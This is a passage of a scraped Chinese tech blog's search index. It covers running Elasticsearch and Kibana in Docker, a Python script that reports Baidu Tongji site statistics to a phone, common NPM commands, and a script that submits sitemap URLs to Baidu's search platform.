"build_hash" : "2f90bbf7b93632e52bcfb59f3b049cb44ec25e96", "build_date" : "2019-10-28T20:40:44.881551Z", "build_snapshot" : false, "lucene_version" : "8.2.0", "minimum_wire_compatibility_version" : "6.8.0", "minimum_index_compatibility_version" : "6.0.0-beta1" }, "tagline" : "You Know, for Search"} 若 Elasticsearch 容器无法正常运行，可使用以下命令查看容器的日志信息。 1# docker logs -f --tail 50 elasticsearch Kibana 安装与运行Kibana 是一个开源的分析与可视化平台，设计出来用于和 Elasticsearch 一起使用。开发者可以用 Kibana 搜索、查看存放在 Elasticsearch 中的数据。Kibana 与 Elasticsearch 的交互方式是各种不同的图表、表格、地图等，直观地展示数据，从而达到高级的数据分析与可视化的目的。值得一提的是，Elasticsearch、Logstash 和 Kibana 这三个技术就是我们常说的 ELK 技术栈，可以说这三个技术的组合是大数据领域中一个很巧妙的设计。一种很典型的 MVC 思想，模型持久层、视图层和控制层。Logstash 担任控制层的角色，负责搜集和过滤数据。Elasticsearch 担任数据持久层的角色，负责储存数据。Kibana 担任视图层角色，拥有各种维度的查询和分析，并使用图形化的界面展示存放在 Elasticsearch 中的数据。 拉取 Docker 镜像1# docker pull kibana:7.4.2 Docker 运行容器1# docker run --name kibana --restart=always -e ELASTICSEARCH_HOSTS=http://192.168.1.103:9200 -p 5601:5601 -d kibana:7.4.2 参数说明 -p 5601:5601：指定 Kibana 监听的 HTTP 端口。 -e ELASTICSEARCH_HOSTS=http://192.168.1.103:9200：指定 Elasticsearch 服务器的地址。 Docker-Compose 运行容器1234567891011version: "3.5"services: kibana: image: kibana:7.4.2 container_name: kibana restart: always ports: - 5601:5601 environment: - ELASTICSEARCH_HOSTS=http://192.168.1.103:9200 查看 Docker 容器是否正常运行浏览器访问 http://192.168.1.115:5601，若 Web 页面可以正常显示，则说明 Kibana 容器正常运行。值得一提的是，192.168.1.115 是 Kibana 容器的 IP 地址，5601 是 Kibana 监听的 HTTP 端口。若 Kibana 容器无法正常运行，可使用以下命令查看容器的日志信息。 1# docker logs -f --tail 50 Kibana 常见错误解决错误一Elasticsearch 容器启动后，抛出以下的异常信息： 123456789101112131415161718192021main ERROR Could not register mbeans java.security.AccessControlException: access denied ("javax.management.MBeanTrustPermission" "register") at java.base/java.security.AccessControlContext.checkPermission(AccessControlContext.java:472) at java.base/java.lang.SecurityManager.checkPermission(SecurityManager.java:444) at java.management/com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.checkMBeanTrustPermission(DefaultMBeanServerInterceptor.java:1805) at java.management/com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:318) at java.management/com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:522) at org.apache.logging.log4j.core.jmx.Server.register(Server.java:393) at org.apache.logging.log4j.core.jmx.Server.reregisterMBeansAfterReconfigure(Server.java:168) at org.apache.logging.log4j.core.jmx.Server.reregisterMBeansAfterReconfigure(Server.java:141) at org.apache.logging.log4j.core.LoggerContext.setConfiguration(LoggerContext.java:558) at org.apache.logging.log4j.core.LoggerContext.start(LoggerContext.java:263) at org.elasticsearch.common.logging.LogConfigurator.configure(LogConfigurator.java:234) at org.elasticsearch.common.logging.LogConfigurator.configure(LogConfigurator.java:127) at org.elasticsearch.bootstrap.Bootstrap.init(Bootstrap.java:310) at org.elasticsearch.bootstrap.Elasticsearch.init(Elasticsearch.java:159) at org.elasticsearch.bootstrap.Elasticsearch.execute(Elasticsearch.java:150) at org.elasticsearch.cli.EnvironmentAwareCommand.execute(EnvironmentAwareCommand.java:86) at org.elasticsearch.cli.Command.mainWithoutErrorHandling(Command.java:125) at org.elasticsearch.cli.Command.main(Command.java:90) at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:115) at org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:92) 解决的方法是在 Elasticsearch 启动之前，添加禁用 Log4j2 的 JMX 功能的 JVM 参数，详细说明请看 这里。 第一种添加方法：在上述的 config/jvm.options 配置文件中添加 JVM 参数： 1-Dlog4j2.disable.jmx=true 第二种添加方法：在上述的 Docker 命令中添加 JVM 参数： 1234567891011# docker run \\ --restart=always \\ --privileged=true \\ --name elasticsearch \\ -p 9200:9200 -p 9300:9300 \\ -e "discovery.type=single-node" \\ -e ES_JAVA_OPTS="-Dlog4j2.disable.jmx=true" \\ -v /etc/elasticsearch/data:/usr/share/elasticsearch/data \\ -v /etc/elasticsearch/config:/usr/share/elasticsearch/config \\ -v /etc/elasticsearch/plugins:/usr/share/elasticsearch/plugins \\ -d elasticsearch:7.4.2 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"百度统计 API（Python 版）",url:"/posts/94326301.html",text:"前言 百度统计 API 文档 百度统计 Token 获取 百度统计 API 调试工具 以下代码参考了官方 PHP 版的 Demo，兼容 Python2，不兼容 Python3 创建 RSA 公钥新建 RSA 公钥文件 api_pub.key，然后将以下内容拷贝并保存到该文件中。 123456-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDHn/hfvTLRXViBXTmBhNYEIJeGGGDkmrYBxCRelriLEYEcrwWrzp0au9nEISpjMlXeEW4+T82bCM22+JUXZpIga5qdBrPkjU08Ktf5n7Nsd7n9ZeI0YoAKCub3ulVExcxGeS3RVxFai9ozERlavpoTOdUzEH6YWHP4reFfpMpLzwIDAQAB-----END PUBLIC KEY----- Python2 代码以下 Python 代码调用了百度统计的 API 接口，默认会获取今天和昨天的网站概况统计数据，然后通过 Server 酱 将 MarkDown 格式（HTML 表格）的统计数据发送到特定的手机（需绑定 Server 酱的微信公众号）。Linux 系统环境下，配合 Python 脚本 + Crontab 定时任务，即可定时发送统计报表信息到特定的手机上，这样就不再需要频繁登录 Web 版的百度统计管理后台了。请自行替换代码中的 PUBLIC_KEY_FILE、USER_NAME、PASS_WORD、TOKEN、SC_URL 变量值，点击此处可查看移动端的展示效果。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345# --*-- coding:utf-8 ---*---import sysimport jsonimport requestsimport mathimport StringIOimport gzipimport rsaimport uuidimport timeimport loggingimport datetimereload(sys)sys.setdefaultencoding('utf8')UUID = str(uuid.uuid1())PUBLIC_KEY_FILE = './api_pub.key'LOG_FILE = \"/tmp/baidu_tongji_report.log\"ACCOUNT_TYPE = '1' # 百度统计的账号类型：ZhanZhang:1, FengChao:2, Union:3, Columbus:4USER_NAME = 'xxxxxxxxx' # 百度统计的用户名PASS_WORD = 'xxxxxxxxxxxxxxxxxx' # 百度统计的密码TOKEN = 'xxxxxxxxxxxxxxxxxxxxxxxxxxx' # 百度统计的TokenAPI_URL = 'https://api.baidu.com/json/tongji/v1/ReportService' # 百度统计的查询接口LOGIN_URL = 'https://api.baidu.com/sem/common/HolmesLoginService' # 百度统计的登录接口SC_URL = 'https://sc.ftqq.com/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.send' # Server酱的消息接口def encrypt(data): # 加载公钥 with open(PUBLIC_KEY_FILE) as publickfile: p = publickfile.read() pubkey = rsa.PublicKey.load_pkcs1_openssl_pem(p) # 用公钥加密 n = int(math.ceil(len(data) * 1.0 / 117)) ret = '' for i in range(n): gzdata = data[i * 117:(i + 1) * 117] ret += rsa.encrypt(gzdata, pubkey) return ret# 解压gzipdef gzdecode(data): f = StringIO.StringIO(data) gziper = gzip.GzipFile(fileobj=f, compresslevel=9) data2 = gziper.read() gziper.close() return data2# 压缩gzipdef gzencode(data): f = StringIO.StringIO() gziper = gzip.GzipFile(fileobj=f, mode='wb', compresslevel=9, ) gziper.write(data) gziper.close() return f.getvalue()# 日期解析器class DateEncoder(json.JSONEncoder): def default(self, obj): if isinstance(obj, datetime.date): return obj.strftime('%Y-%m-%d') else: return json.JSONEncoder.default(self, obj)# 发送消息def sendMessage(title, content): data = {'text': title, 'desp': content} response = requests.get(SC_URL, params=data) return response.contentclass BaiduTongji(object): ucid = None st = None def __init__(self, username, password, token): self.username = username self.password = password self.token = token # login # self.prelogin() ret = self.dologin() self.ucid = str(ret['ucid']) self.st = ret['st'] def prelogin(self): data = {'username': self.username, 'token': self.token, 'functionName': 'preLogin', 'uuid': UUID, 'request': {'osVersion': 'windows', 'deviceType': 'pc', 'clientVersion': '1.0'}, } headers = {'UUID': UUID, 'account_type': ACCOUNT_TYPE, 'Content-Type': 'data/gzencode and rsa public encrypt;charset=UTF-8' } # 压缩 post_data = gzencode(json.dumps(data)) # 加密 post_data = encrypt(post_data) resp = requests.post(LOGIN_URL, data=post_data, headers=headers) ret = json.loads(gzdecode(resp.content[8:])) print 'prelogin:', ret def dologin(self): data = {'username': self.username, 'token': self.token, 'functionName': 'doLogin', 'uuid': UUID, 'request': {'password': self.password} } headers = {'UUID': UUID, 'account_type': ACCOUNT_TYPE, 'Content-Type': 'data/gzencode and rsa public encrypt;charset=UTF-8' } # 压缩 post_data = gzencode(json.dumps(data)) # 加密 post_data = encrypt(post_data) # post resp = requests.post(LOGIN_URL, data=post_data, headers=headers) ret = json.loads(gzdecode(resp.content[8:])) if ret['retcode'] == 0: print u'dologin:', ret['retmsg'], ' ucid:', ret['ucid'], ' st:', ret['st'] return ret def dologout(self): data = {'username': self.username, 'token': self.token, 'functionName': 'doLogout', 'uuid': UUID, 'request': {'ucid': self.ucid, 'st': self.st, } } headers = {'UUID': UUID, 'account_type': ACCOUNT_TYPE, 'Content-Type': 'data/gzencode and rsa public encrypt;charset=UTF-8' } # 压缩 post_data = gzencode(json.dumps(data)) # 加密 post_data = encrypt(post_data) # post resp = requests.post(LOGIN_URL, data=post_data, headers=headers) ret = json.loads(gzdecode(resp.content[8:])) print 'logout:', ret['retmsg'] def getsitelist(self): url = API_URL + '/getSiteList' headers = {'UUID': UUID, 'USERID': self.ucid, 'Content-Type': 'data/json;charset=UTF-8'} data = {'header': {'username': self.username, 'password': self.st, 'token': self.token, 'account_type': ACCOUNT_TYPE, }, 'body': None, } post_data = json.dumps(data) resp = requests.post(url, data=post_data, headers=headers) # print resp.json() return resp.json()['body']['data'][0]['list'] def getdata(self, para): url = API_URL + '/getData' headers = {'UUID': UUID, 'USERID': self.ucid, 'Content-Type': 'data/json;charset=UTF-8'} data = {'header': {'username': self.username, 'password': self.st, 'token': self.token, 'account_type': ACCOUNT_TYPE, }, 'body': para, } post_data = json.dumps(data, cls=DateEncoder) resp = requests.post(url, data=post_data, headers=headers) # print resp.json() return resp.json()['body']''' # 地域分布报告 visit/district/a # pv_count (浏览量(PV)) # pv_ratio (浏览量占比，%) # visit_count (访问次数) # visitor_count (访客数(UV)) # new_visitor_count (新访客数) # new_visitor_ratio (新访客比率，%) # ip_count (IP 数) # bounce_ratio (跳出率，%) # avg_visit_time (平均访问时长，秒) # avg_visit_pages (平均访问页数) # trans_count (转化次数) # trans_ratio (转化率，%) # 网站概况 overview/getTimeTrendRpt # pv_count (浏览量(PV)) # visitor_count (访客数(UV)) # ip_count (IP 数) # bounce_ratio (跳出率，%) # avg_visit_time (平均访问时长，秒) # 趋势分析 trend/time/a # pv_count (浏览量(PV)) # pv_ratio (浏览量占比，%) # visit_count (访问次数) # visitor_count (访客数(UV)) # new_visitor_count (新访客数) # new_visitor_ratio (新访客比率，%) # ip_count (IP 数) # bounce_ratio (跳出率，%) # avg_visit_time (平均访问时长，秒) # avg_visit_pages (平均访问页数) # trans_count (转化次数) # trans_ratio (转化率，%) # avg_trans_cost (平均转化成本，元) # income (收益，元) # profit (利润，元) # roi (投资回报率，%)'''''' # Http 请求参数 para = { 'site_id': site_id, # 站点ID 'method': 'trend/time/a', # 趋势分析报告 'start_date': '20170316', # 所查询数据的起始日期 'end_date': '20170320', # 所查询数据的结束日期 'metrics': 'pv_count,visitor_count', # 所查询指标为PV和UV 'max_results': '0', # 返回所有条数 'gran': 'day', # 按天粒度 day/hour/week/month }'''# 查询网站概况的统计数据def queryOverviewData(): bdtj = BaiduTongji(USER_NAME, PASS_WORD, TOKEN) sites = bdtj.getsitelist() site_id = sites[0]['site_id'] today = ''.join(time.strftime(\"%Y-%m-%d\", time.localtime())) yesterday = datetime.date.today() + datetime.timedelta(-1) para = {'site_id': site_id, 'method': 'overview/getTimeTrendRpt', 'start_date': yesterday, 'end_date': today, 'metrics': 'pv_count,visitor_count,ip_count,bounce_ratio,avg_visit_time', 'max_results': '0', 'gran': 'day', } # 查询数据 data = bdtj.getdata(para) # print json.dumps(data['data'][0]['result']['items'], indent=4) # 日志 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', filename=LOG_FILE) # 打印查询结果 logging.info(json.dumps(data['data'][0]['result']['items'])) # 今日数据 today_data = data['data'][0]['result']['items'][1][1] today_date = json.dumps(data['data'][0]['result']['items'][0][1])[7:-2].replace('/','-') # 昨日数据 yesterday_data = data['data'][0]['result']['items'][1][0] yesterday_date = json.dumps(data['data'][0]['result']['items'][0][0])[7:-2].replace('/','-') # 数据格式化 str_format = ''.join(( '&lt;form&gt;' ' &lt;table&gt;', ' &lt;tr&gt;', ' &lt;th&gt;统计日期&lt;/th&gt;', ' &lt;th&gt;今天（{today_date}）&lt;/th&gt;', ' &lt;th&gt;昨天（{yesterday_date}）&lt;/th&gt;', ' &lt;/tr&gt;\\n', ' &lt;tr&gt;', ' &lt;td&gt;浏览量（PV）&lt;/td&gt;', ' &lt;td&gt;{today_pv_count} &lt;/td&gt;', ' &lt;td&gt;{yesterday_pv_count}&lt;/td&gt;', ' &lt;/tr&gt;\\n\\n', ' &lt;tr&gt;', ' &lt;td&gt;访客数（UV）&lt;/td&gt;', ' &lt;td&gt;{today_visitor_count} &lt;/td&gt;', ' &lt;td&gt;{yesterday_visitor_count}&lt;/td&gt;', ' &lt;/tr&gt;\\n\\n', ' &lt;tr&gt;', ' &lt;td&gt;IP数 &lt;/td&gt;', ' &lt;td&gt;{today_ip_count} &lt;/td&gt;', ' &lt;td&gt;{yesterday_ip_count}&lt;/td&gt;', ' &lt;/tr&gt;\\n\\n', ' &lt;tr&gt;', ' &lt;td&gt;跳出率 &lt;/td&gt;', ' &lt;td&gt;{today_bounce_ratio}% &lt;/td&gt;', ' &lt;td&gt;{yesterday_bounce_ratio}%&lt;/td&gt;', ' &lt;/tr&gt;\\n\\n', ' &lt;tr&gt;', ' &lt;td&gt;平均访问时长&lt;/td&gt;', ' &lt;td&gt;{today_avg_visit_minute}:{today_avg_visit_second} &lt;/td&gt;', ' &lt;td&gt;{yesterday_avg_visit_minute}:{yesterday_avg_visit_second}&lt;/td&gt;', ' &lt;/tr&gt;', ' &lt;/table&gt;', '&lt;/form&gt;')) report = str_format.format( today_date=today_date, today_pv_count=today_data[0], today_visitor_count=today_data[1], today_ip_count=today_data[2], today_bounce_ratio=today_data[3], today_avg_visit_minute=today_data[4]/60, today_avg_visit_second=today_data[4] % 60, yesterday_date=yesterday_date, yesterday_pv_count=yesterday_data[0], yesterday_visitor_count=yesterday_data[1], yesterday_ip_count=yesterday_data[2], yesterday_bounce_ratio=yesterday_data[3], yesterday_avg_visit_minute=yesterday_data[4]/60, yesterday_avg_visit_second=yesterday_data[4] % 60) # 发送消息 title = ''.join(('百度统计报表（', time.strftime(\"%m-%d %H:%M\", time.localtime()), '）')) msgResp = sendMessage(title, report) msgResult = json.loads(msgResp) if msgResult['errno'] == 0: logging.info('message send successed!') else: logging.error(''.join(('message send faild: ', msgResult)))if __name__ == '__main__': queryOverviewData() Crontab 定时任务Linux 系统环境下，配合 Python 脚本 + Crontab 定时任务，即可定时发送统计报表信息。 12# 每天晚上23时59分发送统计报表信息59 23 * * * /usr/bin/python2 /usr/local/baidu-push/baidu_tongji.py 脚本输出的日志信息1234$ cat /tmp/baidu_tongji_report.log2020-01-17 22:15:10,563 - www - INFO - [[[\"2020/01/16\"], [\"2020/01/17\"]], [[218, 65, 65, 76.19, 295], [100, 63, 62, 80.88, 397]], [], []]2020-01-17 22:15:15,737 - www - INFO - message send successed! Docker 一键部署统计服务 Dockerfile 的内容如下，构建生成 Docker 镜像后，使用命令直接启动 Docker 镜像即可。 使用命令直接启动 Docker 镜像时，需要通过 -v 参数挂载对应的文件（如下） a) 将宿主机里的 RSA 公钥文件挂载到 Docker 容器内的 /usr/local/python_scripts/api_pub.key 位置 b) 将宿主机里的 Python 脚本文件挂载到 Docker 容器内的 /usr/local/python_scripts/baidu_tongji.py 位置 123456789101112131415161718192021222324252627282930313233343536from augurproject/python2-and-3MAINTAINER clay&lt;656418510@qq.com&gt;RUN mkdir -p /tmp/baiduRUN touch /var/log/cron.logRUN mkdir -p /usr/local/python_scriptsENV workpath /usr/local/python_scriptsWORKDIR $workpathRUN echo \"Asia/Shanghai\" &gt; /etc/timezoneRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo \"deb http://mirrors.163.com/debian/ stretch main non-free contrib\" &gt; /etc/apt/sources.listRUN echo \"deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb http://mirrors.163.com/debian/ stretch-backports main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb-src http://mirrors.163.com/debian/ stretch main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb-src http://mirrors.163.com/debian/ stretch-updates main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb-src http://mirrors.163.com/debian/ stretch-backports main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN echo \"deb-src http://mirrors.163.com/debian-security/ stretch/updates main non-free contrib\" &gt;&gt; /etc/apt/sources.listRUN apt-get -y update &amp;&amp; apt-get -y upgradeRUN apt-get -y install python-rsa python-requests cron rsyslog vim htop net-tools telnet apt-utils tree wget curl git make gccRUN apt-get -y autoclean &amp;&amp; apt-get -y autoremoveRUN sed -i \"s/#cron./cron./g\" /etc/rsyslog.confRUN echo \"59 23 * * * root /usr/bin/python2 /usr/local/python_scripts/baidu_tongji.py\" &gt;&gt; /etc/crontabCMD service rsyslog start &amp;&amp; service cron start &amp;&amp; tail -f -n 20 /var/log/cron.log 若通过 Docker-Compose 来管理 Docker 镜像，那么 YML 配置文件的内容如下： 12345678910111213version: '3.5'services: baidu-push: image: clay/baidu-push:1.0 container_name: hexo-baidu-push restart: always environment: TZ: 'Asia/Shanghai' volumes: - /usr/local/baidu-push/logs:/tmp/baidu - /usr/local/baidu-push/api_pub.key:/usr/local/python_scripts/api_pub.key - /usr/local/baidu-push/baidu_tongji.py:/usr/local/python_scripts/baidu_tongji.py 数据卷挂载： /usr/local/baidu-push/logs：宿主机里的日志目录 /usr/local/baidu-push/api_pub.key：宿主机里 RSA 公钥文件的路径 /usr/local/baidu-push/baidu_tongji.py：宿主机里 Python 脚本文件的路径 移动端的展示效果 参考资料 yelord/baidutongji zephery/baidutongji var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ \"type\": \"hexo\", \"id\": \"readmore-container\", \"name\": \"全栈技术驿站\", \"blogId\": \"96641-5333172926158-056\", \"qrcode\": \"https://www.techgrow.cn/img/wx_mp_qr.png\", \"keyword\": \"Tech\", \"random\": \"0.9\", \"height\": \"auto\", \"expires\": \"365\", \"lockToc\": \"yes\", \"interval\": \"30\", \"baseUrl\": \"\" }); } catch(e) { console.warn(\"readmore plugin occurred error: \" + e.name + \" | \" + e.message); } }",tags:"python"},{title:"NPM 常用命令介绍",url:"/posts/f93d57c7.html",text:'模块管理NPM 安装与卸载模块1234567891011121314151617# 全局安装$ npm install xxxx -g# 局部安装，且更新package.json文件$ npm install xxxx --save# 卸载指定模块$ npm uninstall xxxx# 卸载全局模块$ npm uninstall xxxx -g# 查看模块的最新版本号$ npm view xxxx version# 查看模块的所有版本号$ npm view xxxx versions NPM 检查模块更新1234567891011# 全局安装检查更新的模块$ npm install npm-check-updates -g# 检查可更新的模块$ npm-check-updates# 更新所有模块，且更新package.json文件中的依赖包到最新版本（企业项目开发切忌一次性全部更新）$ npm-check-updates -u# 更新指定的模块，且更新package.json文件（与模块的安装操作没有本质区别，只是指定了新的版本号），如果执行失败可尝试删除package-lock.json文件后再更新$ npm install xxxx@0.1.9 --save NPM 查看已安装的模块查看局部已安装的模块，--depth 参数表示深度 1$ npm list --depth 0 查看全局已安装的模块，--depth 参数表示深度 1$ npm list -g --depth 0 代理设置NPM 设置代理12345678910# 设置代理与仓库源$ npm config set proxy=http://127.0.0.1:1080$ npm config set registry=http://registry.npmjs.org# 关于Https，若上面使用了https开头的仓库源，此时需要额外设置https_proxy参数，反则不需要设置$ npm config set https-proxy http://127.0.0.1:1080# 取消代理$ npm config delete proxy$ npm config delete https-proxy 权限配置解决 NPM 安装模块的权限问题NPM 出于安全考虑不支持以 root 用户运行，即使用 root 用户身份运行了，NPM 会自动转成一个叫 nobody 的用户来运行，而这个用户几乎没有任何权限。这样的话如果脚本里有一些需要权限的操作，比如写文件（尤其是写 /root/.node-gyp），程序就会崩掉。为了避免这种情况，要么按照 NPM 的规矩来，专门建一个用于运行 npm 命令的高权限用户；要么加 --unsafe-perm 参数，这样就不会切换到 nobody 用户上，运行时是哪个用户就是哪个用户，即使是 root 用户。 1$ npm install --unsafe-perm=true --allow-root NPM 镜像加速在使用 NPM 的过程中经常会遇到无法下载包的问题，这里整理了几种 NPM 使用国内镜像加速的方法。 淘宝镜像源12345# 配置淘宝镜像源$ npm config set registry https://registry.npm.taobao.org# 验证配置是否生效$ npm config get registry 华为云镜像源12345# 配置华为镜像源$ npm config set registry https://mirrors.huaweicloud.com/repository/npm/# 验证配置是否生效$ npm config get registry 使用 CNPM 替代 NPM12345# 全局安装CNPM# npm install -g cnpm --registry=https://registry.npm.taobao.org# 安装模块$ cnpm install xxx 依赖管理查看依赖树 查看整棵依赖树，可以指定树的深度 1$ npm list --depth=5 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"百度搜索资源平台 - 站点天级收录（Python 版）",url:"/posts/3971860d.html",text:'前言注册开通百度熊掌 ID 后（该产品后来改名为移动专区），百度搜索资源平台提供了站点天级收录的 API，可以让站长享受天级收录站点的机会（存在天级收录配额限制），这样可以很大程度地加快站点的收录。本文会给出现成的 Python 版本站点天级收录代码，系统环境依赖 Linux，软件环境依赖 Python3、Curl。 Python3 代码以下代码会读取特定域名下的 sitemap 站点地图文件，然后通过 Curl 命令将站点地图文件中合法 （结尾为 .html）的 URL 批量提交给百度搜索资源平台，请自行替换代码中的 domain、app_id、token、site_map_url、day_submit_max_lines 变量值。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125# -*- coding: utf-8 -*-import reimport osimport loggingimport subprocessfrom io import StringIOfrom urllib import request# 站点域名domain = \'www.example.com\'# 搜索资源平台申请的唯一识别IDapp_id = \'xxxxxxxxxxxxxxxxx\'# 搜索资源平台申请的提交用的准入密钥token = \'xxxxxxxxxxxxxxxxxxxxxx\'# 站点地图的URLsite_map_url = \'https://www.example.com/sitemap.xml\'# 最大的提交数量（天级收录配额）day_submit_max_lines = 10# 提交链接的接口day_submit_url = \'http://data.zz.baidu.com/urls?appid={app_id}&amp;token={token}&amp;type=realtime\'.format(app_id=app_id, token=token)# 提交的URL链接文件day_submit_urls_file = "/tmp/baidu_xiongzhang_day_submit_url.txt"# 记录历史提交位置的索引文件（索引从一开始）day_record_file = "/tmp/baidu_xiongzhang_day_record.txt"# 日志文件log_file = "/tmp/baidu_xiongzhang_day.log"def regexpMatchUrl(content): pattern = re.findall(r\'(http|https):\\/\\/[\\w\\-_]+(\\.[\\w\\-_]+)+([\\w\\-\\.,@?^=%&amp;amp;:/~\\+#]*[\\w\\-\\@?^=%&amp;amp;/~\\+#])?\', content, re.IGNORECASE) if pattern: return True else: return Falsedef regexpMatchWebSite(content): pattern = re.findall(r\'\'.join(domain), content, re.IGNORECASE) if pattern: return True else: return Falsedef getUrl(content): pattern = re.findall(r\'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+.html\', content, re.IGNORECASE) if pattern: return pattern[0] else: return \'\'def writeRecordFile(record_file_path, content): record_file = open(record_file_path, \'w\') record_file.writelines(content) record_file.close()def readRecordFile(record_file_path): content = "0" if(os.path.exists(record_file_path)): record_file = open(record_file_path, \'r\') content = record_file.readline() record_file.close() if(len(content) == 0): content = "0" return contentdef countWebsiteMapUrl(): total = 0 content = request.urlopen(site_map_url).read().decode(\'utf8\') website_map_file = StringIO(content) for line in website_map_file: if(regexpMatchUrl(line) and regexpMatchWebSite(line)): total = total + 1 website_map_file.close() return totaldef createUrlFile(url_file_path, max_lines): old_index = readRecordFile(day_record_file) content = request.urlopen(site_map_url).read().decode(\'utf8\') website_map_file = StringIO(content) url_file = open(url_file_path, \'w\') # write url file index = 0 number = 0 for line in website_map_file: if(regexpMatchUrl(line) and regexpMatchWebSite(line)): if(index &lt; int(old_index)): index = index + 1 continue url = getUrl(line) if(url != \'\'): index = index + 1 number = number + 1 url_file.writelines(url + "\\n") if(number &gt;= max_lines): break # update record file if(index == countWebsiteMapUrl()): writeRecordFile(day_record_file, str(0)) else: writeRecordFile(day_record_file, str(index)) # close file url_file.close() website_map_file.close()def submitUrlFile(url, url_file_path, log_file): shell_cmd_line = "curl -H \'Content-Type:text/plain\' --data-binary @" + url_file_path + " " + \'\\"\' + url + \'\\"\' (status, output) = subprocess.getstatusoutput(shell_cmd_line) logging.info(output + "\\n") # print(shell_cmd_line)if __name__ == "__main__": logging.basicConfig(level=logging.INFO, format=\'%(asctime)s - %(name)s - %(levelname)s - %(message)s\', filename=log_file) createUrlFile(day_submit_urls_file, day_submit_max_lines) submitUrlFile(day_submit_url, day_submit_urls_file, log_file) Crontab 定时任务Linux 系统环境下，配合 Python 脚本 + Crontab 定时任务，即可定时主动提交链接到百度搜索资源平台。 12# 每天凌晨三点主动提交一次链接0 3 * * * /usr/bin/python3 /usr/local/baidu-push/baidu_xiongzhang_day.py 脚本输出的日志信息12345678$ cat /tmp/baidu_xiongzhang_day.log2020-01-19 21:46:08,072 - www - INFO - % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0100 507 100 67 100 440 555 3648 --:--:-- --:--:-- --:--:-- 3666{"remain":5,"success":10,"success_realtime":10,"remain_realtime":5} Docker 一键部署收录服务 Dockerfile 的内容如下，构建生成 Docker 镜像后，使用命令直接启动 Docker 镜像即可。 使用命令直接启动 Docker 镜像时，需要通过 -v 参数将宿主机的 Python 脚本文件挂载到 Docker 容器内的 /usr/local/python_scripts/baidu_xiongzhang_day.py 位置。 123456789101112131415161718192021222324252627282930313233343536from augurproject/python2-and-3MAINTAINER clay&lt;656418510@qq.com&gt;RUN mkdir -p /tmp/baiduRUN touch /var/log/cron.logRUN mkdir -p /usr/local/python_scriptsENV workpath /usr/local/python_scriptsWORKDIR $workpathRUN echo "Asia/Shanghai" &gt; /etc/timezoneRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN cp /etc/apt/sources.list /etc/apt/backup.sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch main non-free contrib" &gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-updates main non-free contrib" &gt;&gt; /etc/apt/sources.listRUN echo "deb http://mirrors.163.com/debian/ stretch-backports main 